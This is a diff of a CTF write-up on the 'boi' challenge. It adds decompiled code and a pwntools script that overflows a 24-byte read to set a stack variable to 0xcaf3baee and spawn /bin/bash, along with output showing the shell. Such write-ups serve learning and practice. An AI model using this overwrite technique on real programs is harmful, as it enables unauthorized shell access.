@@ -13,46 +13,67 @@ Sat Sep 18 08:51:12 PM CEST 2021
 ```
 
 This challenge looks similar to the past ones: a prompt that asks for input. The
-challenge description says this is solved by smashing the stack. The binary is not PIE
-which could come in handy.
+challenge description says this is solved by smashing the stack.
+
+Let's take a look at main:
 
 ```
-~/Downloads > checksec --file=boi
-RELRO           STACK CANARY      NX            PIE       [...]
-Partial RELRO   Canary found      NX enabled    No PIE    [...]
+undefined8 main(void)
+
+{
+  long in_FS_OFFSET;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined4 uStack40;
+  uint iStack36;
+  undefined4 local_20;
+  long canary;
+  
+  canary = *(long *)(in_FS_OFFSET + 40);
+  local_38 = 0;
+  local_30 = 0;
+  local_20 = 0;
+  uStack40 = 0;
+  iStack36 = 3735928559;
+  puts("Are you a big boiiiii??");
+  read(0,&local_38,24);
+  if (iStack36 == 0xcaf3baee) {
+    run_cmd("/bin/bash");
+  }
+  else {
+    run_cmd("/bin/date");
+  }
+  if (canary != *(long *)(in_FS_OFFSET + 40)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
 ```
 
-If you're not familiar with PIE and ASLR. Here's a quick rundown of what they
-are, how they're related and why they make things difficult for us:
+Ok so if we can figure out how to make `iStack36` be equal to `0xcaf3baee` then we'll get access to a shell and the challenge is solved.
 
-The memory of a running process is made up by contiguous sequences of related
-bytes. There's one for the machine code, one for the stack, one for the heap,
-one for global data, etc.. They are all located somewhere in the virtual address
-space. Sometimes as specified by the executable, other times randomly.
+You can see that the binary reads 24 bytes and stores them in the stack starting from `local_38`. But that is only 8 bytes. So `local_30` takes up another 8 bytes. Then `uStack40` takes 4. And then we have our target variable `iStack36` taking up the remaining 4.
 
-When their position is constant between executions, we can figure out addresses
-that are of intereset to us (the address of a variable that needs to be changed
-for instance) and use them to prepare our exploit.
+Can we craft a 24 bytes input which puts the last 4 bytes inside `iStack36`? Yes it's very straightforward. Here's a Python script that does that:
 
-But when their position change, we cannot know the address until we execut the
-process and thus our exploit must react dynamically, we can't embed a static
-address.
+```python
+from pwn import *
 
-ASLR stands for Address Space Layout Randomization and is the process that the
-operating system performs when first loading your executable. When enabled, it
-places any memory region in a random position along the virtual address space.
+p = process("./boi")
 
-But not all executable can handle their memory regions being loaded at any
-address! Take the memory region containing the machine code for instance, `JMP`
-instructions will have to add an offset to the current instruction instead of
-jumping to an absolute address in order to work.
+p.sendline(20 * b" " + bytes.fromhex("caf3baee")[::-1])
+p.interactive()
+```
 
-The executables that support this are called PIE: Position Independent
-Executables and when you're compiling an executable you can decide whether you
-want it to be PIE or not.
+The `[::-1]` I added simply because it didn't work without it so I figured it
+could be an endianness issue, and it was because reversing the bytes solved it.
 
-ASLR needs an executable to be PIE in order to randomize the position of the
-machine code region. If any of those two are disabled, every machine code
-instruction will always have the same address! And this can be exploited as we'll see.
-
-Ok so now back to our challenge.
+```
+~/Downloads > python pwn_boi.py 
+[+] Starting local process './boi': pid 19183
+[*] Switching to interactive mode
+Are you a big boiiiii??
+$ whoami
+elia
+```
